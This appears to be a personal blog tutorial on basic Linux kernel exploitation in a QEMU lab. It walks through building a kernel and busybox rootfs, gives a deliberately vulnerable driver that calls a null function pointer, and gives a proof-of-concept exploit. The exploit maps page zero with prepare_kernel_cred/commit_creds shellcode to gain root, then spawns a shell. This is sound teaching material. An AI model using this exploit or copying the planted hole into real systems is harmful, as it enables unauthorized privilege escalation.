---
title: null dereference
tags:
  - kernel
  - pwn
date: 2020-02-12 13:47:37
---


> show the basic approach in kernel pwn

host environment:
- Linux 4.19.102 x86_64
- gcc 9.2.0
- qemu 4.2.0
- busybox 1.31.1
- linux-5.5.2
<!-- more -->
## Prepare

### compile kernel

> here choose the latest kernel (5.5.2), use tsinghua mirror to speed up

remember to check the following options on.

```
kernel hacking ->
    Compile-time checks and compiler options ->
        Compile the kernel with debug info
    Generic kernel Debugging Instruments ->
        KGDB: kernel debugger
```
```bash
make nconfig
make -j8
```

### compile busybox

remember to check the `Settings -> Build static binary (no shared libs)` option on.
check the `Linux System Utilities -> Support mountiong NFS file systems on Linux < 2.6.23` and `Networking Utilities -> inetd` options **off**.

```bash
make menuconfig
make -j8
```

### prepare rootfs

```bash
cd _install
mkdir -p dev etc/init.d proc sys
echo "#!/bin/sh \
      mount -t proc none /proc \
      mount -t sysfs none /sys \
      /sbin/mdev -s" > etc/init.d/rcS
chmod +x etc/init.d/rcS
find .|cpio -o --format=newc > ../rootfs.img
```

### boot the kernel

```bash
$ qemu-system-x86_64 -s -kernel ~/Downloads/linux-5.5.2/arch/x86_64/boot/bzImage -initrd ~/Downloads/busybox-1.31.1/rootfs.img -append "root=/dev/ram rdinit=/sbin/init"
# qemu-system-x86_64 -s -kernel ~/Downloads/linux-5.5.2/arch/x86_64/boot/bzImage -initrd ~/Downloads/busybox-1.31.1/rootfs.img -append "root=/dev/ram rdinit=/sbin/init console=ttyS0" --nographic

# -s: remote debug on tcp::1234
```

## vulnerable kernel driver

### nrd.c and makefile
```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>

void (*func)(void);

ssize_t vuln(struct file *filep, const char __user *buffer, size_t count, loff_t *pos) {
	func();
	return count;
}
static struct file_operations ops = {
	.write = vuln
};

static int __init nrd_init(void) {
	printk(KERN_ALERT "null_dereference driver init!\n");
	proc_create("vuln", 0666, NULL, &ops);
	return 0;
}

static void __exit nrd_exit(void) {
	printk(KERN_ALERT "null_dereference driver exit!\n");
}

module_init(nrd_init);
module_exit(nrd_exit);

MODULE_AUTHOR("void0red");
MODULE_LICENSE("GPL");⏎ 
```

```makefile
obj-m := nrd.o
KERNELDIR := /home/void0red/Downloads/linux-5.5.2
PWD := $(shell pwd)

all:
	$(MAKE) -C $(KERNELDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KERNELDIR) M=$(PWD) clean
```

### poc.c

```c
#include <stdlib.h>
#include <sys/types.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

char payload[] = "\x48\x31\xff\xe8\x68\xc0\x08\x81\xe8\x23\xbc\x08\x81\xc3";

int main() {
	mmap(0, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	memcpy(0, payload, sizeof(payload));
	int fd = open("/proc/vuln", O_WRONLY);
	write(fd, "a", 1);
	system("/bin/sh");
	return 0;
}

$ gcc --staitc poc.c -o poc

```

### details

1. execute chain: vuln -> prepare_kernel_cred -> commit_creds
2. how to get the address of the key function:
    1. use the `System.map` file in the root of kernel source folder
        ```bash
        $ grep prepare_kernel_cred System.map
        ffffffff8108c070 T prepare_kernel_cred
        ffffffff822e6760 r __ksymtab_prepare_kernel_cred
        ffffffff822fbb4b r __kstrtabns_prepare_kernel_cred
        ffffffff822fbb4c r __kstrtab_prepare_kernel_cred
        ```
    2. use /proc/kallsyms in the kernel
        ```bash
        $ grep commit_creds /proc/kallsyms
        ```
        but should remember to append **nokalsr** to boot the kernel
        ```bash
        $ qemu-system-x86_64 -s -kernel ~/Downloads/linux-5.5.2/arch/x86_64/boot/bzImage -initrd ~/Downloads/busybox-1.31.1/rootfs.img -append "root=/dev/ram rdinit=/sbin/init nokaslr"
        ```
3. how to make the payload
    ```asm
    # poc.s
    xor %rdi, %rdi
    call 0xffffffff8108c070 # prepare_kernel_cred
    call 0xffffffff8108bc30 # commit_creds
    ret
    ```

    ```bash
    $ gcc poc.s -nostdlib -Ttext=0
    $ objdump -d a.out

    a.out:     file format elf64-x86-64


    Disassembly of section .text:

    0000000000000000 <.text>:
    0:	48 31 ff             	xor    %rdi,%rdi
    3:	e8 68 c0 08 81       	callq  ffffffff8108c070 <__bss_start+0xffffffff8108a070>
    8:	e8 23 bc 08 81       	callq  ffffffff8108bc30 <__bss_start+0xffffffff81089c30>
    d:	c3                   	retq   

    ```
4. mmap_min_addr
    ```bash
    # use to allow low memory mmap
    $ sysctl -w vm.mmap_min_addr="0"
    ```